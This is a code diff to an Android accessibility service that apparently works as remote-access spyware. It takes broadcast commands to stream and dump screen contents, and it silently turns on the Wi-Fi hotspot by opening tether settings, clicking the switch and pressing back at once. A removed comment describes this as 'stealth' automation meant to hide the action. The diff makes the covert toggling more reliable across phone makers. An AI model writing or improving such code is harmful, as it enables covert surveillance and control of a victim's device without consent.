@@ -6,6 +6,8 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.os.Handler
+import android.os.Looper
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import org.json.JSONArray
@@ -17,9 +19,7 @@ class SystemAccessibility : AccessibilityService() {
     private var lastDumpTime = 0L
     private val DUMP_INTERVAL_MS = 500L
 
-    // State trackers for stealth hotspot automation
     private var isAutomatingHotspot = false
-    private var hotspotAutomationStartTime = 0L
 
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -30,19 +30,23 @@ class SystemAccessibility : AccessibilityService() {
                 "stream_screen_start" -> isStreamingScreen = true
                 "stream_screen_stop" -> isStreamingScreen = false
                 "toggle_hotspot" -> {
-                    // Activate automation state and start timeout timer
                     isAutomatingHotspot = true
-                    hotspotAutomationStartTime = System.currentTimeMillis()
+                    
+                    // FAILSAFE: Force close settings after 3 seconds if it fails to find the switch
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (isAutomatingHotspot) {
+                            isAutomatingHotspot = false
+                            performGlobalAction(GLOBAL_ACTION_BACK)
+                        }
+                    }, 3000)
                     
                     try {
-                        // Attempt standard direct entry point
                         val settingsIntent = Intent().apply {
                             setClassName("com.android.settings", "com.android.settings.TetherSettings")
                             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                         }
                         this@SystemAccessibility.startActivity(settingsIntent)
                     } catch (e: Exception) {
-                        // Fallback entry point
                         val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
                             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                         }
@@ -73,41 +77,26 @@ class SystemAccessibility : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         // --- 1. HOTSPOT AUTOMATION LOGIC ---
         if (isAutomatingHotspot) {
-            // Failsafe: If automation takes more than 4 seconds, abort and close to prevent being stuck
-            if (System.currentTimeMillis() - hotspotAutomationStartTime > 4000) {
-                isAutomatingHotspot = false
-                performGlobalAction(GLOBAL_ACTION_BACK)
-                return
-            }
-
             val rootNode = rootInActiveWindow ?: return
             
-            // Comprehensive list of strings used by different OEMs for the Hotspot toggle
-            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering")
+            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering", "Hotspot", "Mobile Hotspot")
             var clicked = false
 
             for (keyword in keywords) {
-                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
-                if (nodes.isNotEmpty()) {
-                    val clickableNode = findClickableParent(nodes.first())
-                    if (clickableNode != null) {
-                        clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        clicked = true
-                    }
+                if (findAndClickSwitchForText(rootNode, keyword)) {
+                    clicked = true
+                    break
                 }
-                nodes.forEach { it.recycle() }
-                if (clicked) break
             }
 
-            // If we successfully clicked the toggle, wait 250ms and instantly press back to hide it
             if (clicked) {
                 isAutomatingHotspot = false
-                Thread.sleep(250)
+                Thread.sleep(300) // Let the UI register the toggle
                 performGlobalAction(GLOBAL_ACTION_BACK)
             }
             
             rootNode.recycle()
-            return // Skip screen streaming logic while automating
+            return 
         }
 
         // --- 2. SCREEN STREAMING LOGIC ---
@@ -127,19 +116,111 @@ class SystemAccessibility : AccessibilityService() {
         }
         
         val broadcast = Intent("com.systemlinker.SCREEN_DATA").apply {
-            // Also explicitly routing the screen data back to the manager
             setPackage(applicationContext.packageName)
             putExtra("json", jsonPayload.toString())
         }
         sendBroadcast(broadcast)
     }
-    
+
+    /**
+     * Master Search Function: Chains multiple strategies to guarantee a click.
+     */
+    private fun findAndClickSwitchForText(rootNode: AccessibilityNodeInfo, text: String): Boolean {
+        
+        // Strategy 1: Tree Climbing (Structural Search)
+        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
+        if (!nodes.isNullOrEmpty()) {
+            for (node in nodes) {
+                var currentParent = node.parent
+                var depth = 0
+                while (currentParent != null && depth < 4) {
+                    val switchNode = searchForSwitchInTree(currentParent)
+                    if (switchNode != null && switchNode.isClickable) {
+                        if (switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+                    } else if (switchNode != null && currentParent.isClickable) {
+                        if (currentParent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+                    }
+                    currentParent = currentParent.parent
+                    depth++
+                }
+                
+                // Fallback 1: Just click whatever is clickable around the text
+                val clickable = findClickableParent(node)
+                if (clickable != null && clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+            }
+        }
+
+        // Strategy 2: Sequential Linear Lookahead (User's Algorithm)
+        val state = SearchState()
+        if (dfsSequentialSearch(rootNode, text, state)) {
+            return true
+        }
+
+        return false
+    }
+
+    // State tracker for the sequential search
+    private class SearchState(var recentMatch: Boolean = false, var steps: Int = 0)
+
+    /**
+     * Sequential DFS algorithm: 
+     * Scans UI top-to-bottom. If it sees the keyword, it keeps its eyes open for the next 
+     * 6 elements. If any of those are a Switch/Toggle, it clicks it immediately.
+     */
+    private fun dfsSequentialSearch(node: AccessibilityNodeInfo?, targetText: String, state: SearchState): Boolean {
+        if (node == null) return false
+
+        val nodeText = node.text?.toString() ?: ""
+        
+        // Did we hit the keyword?
+        if (nodeText.contains(targetText, ignoreCase = true)) {
+            state.recentMatch = true
+            state.steps = 0
+        } else if (state.recentMatch) {
+            state.steps++
+        }
+
+        // If we recently saw the keyword, actively look for a switch in the next few elements
+        if (state.recentMatch && state.steps <= 6) {
+            val cName = node.className?.toString() ?: ""
+            if (cName.contains("Switch") || node.isCheckable) {
+                // Found a toggle right after the text! Click it.
+                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+                
+                // Try clicking its direct parent if the switch itself isn't technically clickable
+                val p = node.parent
+                if (p != null && p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+            }
+        }
+
+        // Continue scanning children sequentially
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            val clicked = dfsSequentialSearch(child, targetText, state)
+            child?.recycle() // Free memory
+            if (clicked) return true
+        }
+        return false
+    }
+
+    private fun searchForSwitchInTree(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (node == null) return null
+        val className = node.className?.toString() ?: ""
+        
+        if (className.contains("Switch") || node.isCheckable) return node
+        
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            val found = searchForSwitchInTree(child)
+            if (found != null) return found
+        }
+        return null
+    }
+
     private fun findClickableParent(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
         var currentNode = node
         while (currentNode != null) {
-            if (currentNode.isClickable) {
-                return currentNode
-            }
+            if (currentNode.isClickable) return currentNode
             val parent = currentNode.parent
             if (currentNode != node) currentNode.recycle()
             currentNode = parent
